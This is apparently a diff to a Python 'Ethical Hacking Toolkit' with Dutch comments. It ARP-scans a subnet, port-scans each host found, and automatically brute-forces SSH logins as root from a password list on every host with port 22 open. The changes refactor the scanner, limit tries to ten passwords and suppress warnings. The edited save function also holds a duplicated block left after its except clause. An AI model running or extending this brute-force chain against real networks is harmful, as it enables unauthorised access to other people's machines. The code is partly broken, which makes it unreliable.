@@ -1,22 +1,32 @@
+import warnings
 import datetime
 import socket
 import base64
 import json
 import logging
-from typing import Dict, List, Union, Any
+import sys
+from typing import Dict, List, Union, Any, Optional
 from concurrent.futures import ThreadPoolExecutor
 from pathlib import Path
 import platform
 import asyncio
-import time  # Nieuw voor rate limiting
+import time
+
+# Onderdruk waarschuwingen
+warnings.filterwarnings("ignore", category=DeprecationWarning)
+warnings.filterwarnings("ignore", message=".*TripleDES.*")
 
 from scapy.all import ARP, Ether, srp, get_working_ifaces
 import paramiko
 
-# Veiligheidsconfiguratie
-logging.getLogger("paramiko").setLevel(logging.WARNING)  # Minder verbose logging
-MAX_SCAN_PORTS = 15  Beperk aantal poorten
-MIN_RATE_LIMIT = 1.0  # Minimaal 1 seconde tussen pogingen
+# Voorkom onnodige logging
+logging.getLogger("scapy").setLevel(logging.ERROR)
+logging.getLogger("paramiko").setLevel(logging.WARNING)
+
+# Configuratie
+MAX_SCAN_PORTS = 15
+MIN_RATE_LIMIT = 1.0
+MAX_HISTORY_FILES = 3
 
 # Configureer logging
 logging.basicConfig(
@@ -26,24 +36,40 @@ logging.basicConfig(
 )
 
 def save_results(data: Dict, filename: str = "scan_results") -> None:
-    """Opslaan van resultaten in een JSON-bestand met Base64 encoded filename"""
+    """Sla resultaat op in de huidige folder."""
     try:
+        # Gebruik de huidige werkmap
+        current_dir = Path.cwd()
+        
+        # Genereer bestandsnaam
         timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         safe_name = base64.b64encode(f"{filename}_{timestamp}".encode()).decode()
-        output_path = Path(f"./results/{safe_name}.json")
-        
-        output_path.parent.mkdir(parents=True, exist_ok=True)
-        
+        output_path = current_dir / f"{safe_name}.json"
+
+        # Schrijf data
+        with output_path.open('w', encoding='utf-8') as f:
+            json.dump({
+                "timestamp": timestamp,
+                "data": data
+            }, f, indent=2, default=str)
+
+        logging.info(f"Resultaten opgeslagen: {output_path.resolve()}")
+
+    except Exception as e:
+        logging.error(f"Opslagfout: {str(e)}")
+
+
+        # Schrijf data
         with output_path.open('w') as f:
             json.dump({
                 "timestamp": timestamp,
                 "data": data
             }, f, indent=2, default=str)
-            
-        logging.info(f"Resultaten opgeslagen in {output_path.resolve()}")
-        
+
+        logging.info(f"Resultaten opgeslagen: {output_path.name}")
+
     except Exception as e:
-        logging.error(f"Fout bij opslaan: {str(e)}")
+        logging.error(f"Opslagfout: {str(e)}")
 
 def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
     """Geavanceerde ARP-scanner met interface detectie"""
@@ -58,7 +84,7 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         # Interface selectie
         logging.info("Beschikbare interfaces:")
         for idx, iface in enumerate(available_ifaces):
-            logging.info(f"  {idx}: {iface.name} - IP: {iface.ip}")
+            logging.info(f"{idx}: {iface.name} - {iface.ip}")
 
         while True:
             try:
@@ -75,14 +101,13 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         ether_layer = Ether(dst="ff:ff:ff:ff:ff:ff")
         packet = ether_layer/arp_layer
 
-        # Uitvoeren scan met langere timeout
+        # Scan uitvoeren
         result, _ = srp(
             packet,
             iface=iface.name,
-            timeout=5,  # Verhoogde timeout
+            timeout=5,
             verbose=0,
-            inter=0.1,
-            threaded=True
+            inter=0.1
         )
 
         devices = [{
@@ -100,42 +125,49 @@ def arp_scan(target_ip: str = "192.168.1.0/24") -> List[Dict[str, str]]:
         logging.critical(f"ARP-scan fout: {str(e)}")
         return []
 
+async def check_port(host: str, port: int) -> Optional[tuple]:
+    """Controleer of een poort open is"""
+    try:
+        reader, writer = await asyncio.wait_for(
+            asyncio.open_connection(host, port),
+            timeout=1.5
+        )
+        writer.close()
+        await writer.wait_closed()
+        
+        # Service naam bepalen
+        try:
+            service = socket.getservbyport(port)
+        except (OSError, socket.error):
+            service = "onbekend"
+            
+        return (port, service)
+    except Exception:
+        return None  # Geeft expleciet None terug bij fouten
+
 async def async_port_scan(host: str, ports: List[int] = None) -> Dict[int, str]:
-    """Asynchrone portscanner met service detectie"""
+    """Asynchrone portscanner met verbeterde foutafhandeling"""
     logging.info(f"Portscan gestart voor {host}")
     
-    # Standaard poortenlijst met beperking
+    # Standaard poortenlijst
     default_ports = [21, 22, 23, 80, 443, 8080, 3389, 5900]
     ports = ports[:MAX_SCAN_PORTS] if ports else default_ports
     
     open_ports = {}
-    loop = asyncio.get_event_loop()
     
-    async def check_port(port: int) -> Union[None, tuple]:
-        try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port),
-                timeout=1.5
-            )
-            writer.close()
-            await writer.wait_closed()
-            try:
-                service = socket.getservbyport(port)
-            except OSError:
-                service = "onbekend"
-            return (port, service)
-        except Exception:
-            return None
-
-    tasks = [check_port(port) for port in ports]
+    # Maak taken voor elke port
+    tasks = [check_port(host, port) for port in ports]
+    
+    # Wacht op resultaten
     results = await asyncio.gather(*tasks)
     
+    # Verwerk resultaten veilig
     for result in results:
-        if result:
+        if result is not None:  # Expliciete check op None
             port, service = result
             open_ports[port] = service
             logging.warning(f"Poort {port} ({service}) is open")
-
+    
     return open_ports
 
 def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_workers: int = 3) -> bool:
@@ -147,7 +179,7 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
     
     try:
         with open("passwords.txt") as f:
-            passwords = [line.strip() for line in f if line.strip()]
+            passwords = [line.strip() for line in f if line.strip()][:10]  # Max 10 wachtwoorden
     except FileNotFoundError:
         logging.error("passwords.txt niet gevonden!")
         return False
@@ -167,7 +199,7 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
             client.close()
             return True
         except Exception as e:
-            logging.debug(f"Mislukt: {password} - {str(e)}")
+            logging.debug(f"Mislukt: {password}")
             return False
 
     try:
@@ -181,16 +213,16 @@ def ssh_bruteforce(host: str, port: int = 22, username: str = "root", max_worker
         return False
 
 async def main():
-    print("=== Ethical Hacking Toolkit v2 ===")
-    print("Gebruik alleen voor legitieme doeleinden!\n")
+    print("=== Ethical Hacking Toolkit ===")
+    print("Alleen voor geautoriseerd gebruik!\n")
     
     if platform.system() == "Windows":
-        print("[!] Draai als Administrator en installeer Npcap")
+        print("[!] Draai als Administrator")
     
-    target = input("Voer target IP/netwerk in: ").strip()
+    target = input("Target IP/netwerk: ").strip()
     if '/' not in target:
         target += "/24"
-        logging.info(f"Subnetmasker toegevoegd: {target}")
+        logging.info(f"Subnet toegevoegd: {target}")
 
     results = {
         'arp_scan': [],
@@ -202,7 +234,7 @@ async def main():
     results['arp_scan'] = arp_scan(target)
     
     if results['arp_scan']:
-        # Scan alle gevonden IP's
+        # Scan per apparaat
         for device in results['arp_scan']:
             current_ip = device['IP']
             try:
@@ -215,12 +247,22 @@ async def main():
                 else:
                     results['ssh_bruteforce'][current_ip] = "Niet uitgevoerd (poort 22 gesloten)"
             except Exception as e:
-                logging.error(f"Fout bij scan van {current_ip}: {str(e)}")
+                logging.error(f"Fout bij {current_ip}: {str(e)}")
+                # Voeg foutinfo toe aan resultaten
+                if current_ip not in results['open_ports']:
+                    results['open_ports'][current_ip] = {}
+                if current_ip not in results['ssh_bruteforce']:
+                    results['ssh_bruteforce'][current_ip] = "Fout tijdens scan"
 
     # Opslaan resultaten
     save_results(results)
     
-    print("\n[!] Audit voltooid. Raadpleeg de logs en JSON-output.")
+    print("\n[!] Scan voltooid. Bekijk de resultatenbestanden.")
 
 if __name__ == "__main__":
+    # Onderdruk alle TripleDES waarschuwingen voordat asyncio start
+    if not sys.warnoptions:
+        import os
+        os.environ["PYTHONWARNINGS"] = "ignore::DeprecationWarning"
+    
     asyncio.run(main())
